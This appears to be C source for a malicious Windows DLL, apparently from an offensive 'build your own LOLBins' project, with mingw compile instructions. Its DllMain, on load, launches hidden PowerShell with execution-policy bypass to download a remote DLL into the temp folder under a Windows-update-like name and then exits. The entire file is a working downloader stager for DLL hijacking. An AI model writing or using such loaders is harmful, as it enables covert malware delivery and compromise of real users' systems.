// For x64 compile with: x86_64-w64-mingw32-gcc lazarus.c -shared -o lazarus.dll
// For x86 compile with: i686-w64-mingw32-gcc lazarus.c -shared -o lazarus.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -exec bypass -nop -noexit -c iwr -Uri https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/dll/byol64.dll -OutFile $env:TEMP\\wuaueng.dll");
        ExitProcess(0);
    }
    return TRUE;
}